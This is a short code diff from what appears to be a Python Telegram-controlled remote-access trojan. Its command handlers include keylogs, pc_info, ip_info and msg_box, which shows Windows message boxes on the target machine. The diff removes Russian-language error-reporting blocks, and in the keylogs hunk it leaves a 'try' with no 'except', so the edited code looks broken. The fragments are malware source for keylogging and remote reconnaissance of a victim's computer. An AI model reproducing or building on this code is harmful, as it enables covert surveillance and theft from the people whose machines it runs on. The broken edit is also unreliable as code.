@@ -111,12 +111,6 @@ def keylogs(message):
     try:
         error_message = f"ВЫПОЛНЕННО!!!"
         bot.send_message(chat_id, error_message)
-    except PermissionError as e:
-        error_message = f"ОШИБКА:: {e}"
-        bot.send_message(chat_id, error_message)
-    except Exception as e:
-        error_message = f"ОШИБКА: {e}"
-        bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['pc_info'])
 def pc_info(message):
     chat_id = message.chat.id
@@ -145,15 +139,6 @@ def msg_box(message):
         message_bytes = message_text.encode('cp1251')
         ctypes.windll.user32.MessageBoxA(0, message_bytes, 'Information', 0)
         bot.send_message(chat_id, 'MsgBox Displayed')
-    try:
-        error_message = f"ВЫПОЛНЕННО!!!"
-        bot.send_message(chat_id, error_message)
-    except PermissionError as e:
-        error_message = f"ОШИБКА:: {e}"
-        bot.send_message(chat_id, error_message)
-    except Exception as e:
-        error_message = f"ОШИБКА: {e}"
-        bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['ip_info'])
 def ip_info(message):
     chat_id = message.chat.id
